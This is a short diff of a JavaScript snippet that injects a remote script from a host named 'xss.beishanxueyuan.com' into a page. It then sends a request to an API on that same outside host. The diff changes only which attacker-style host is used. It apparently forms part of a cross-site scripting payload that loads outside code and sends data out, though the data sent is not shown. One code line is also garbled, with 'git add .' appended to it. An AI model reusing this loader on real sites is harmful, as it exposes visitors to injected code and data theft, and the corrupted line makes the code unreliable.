@@ -1,7 +1,7 @@
 (function () {
     var s1 = document.createElement('script');
-    s1.src = 'https://1307441225-01mafkkcql.ap-guangzhou.tencentscf.com/1.js';
-    document.body.appendChild(s1);
+    s1.src = 'https://xss.beishanxueyuan.com/1.js';
+    document.body.appendChild(s1);git add .
   
     s1.onload = async function () {
       try {
@@ -31,7 +31,7 @@
         };
   
         console.time('send');
-        fetch('https://1307441225-01mafkkcql.ap-guangzhou.tencentscf.com/api/send', requestOptions)
+        fetch('https://xss.beishanxueyuan.com/api/get', requestOptions)
           .then(response => {
             console.timeEnd('send');
             if (!response.ok) throw new Error('网络响应不正常');
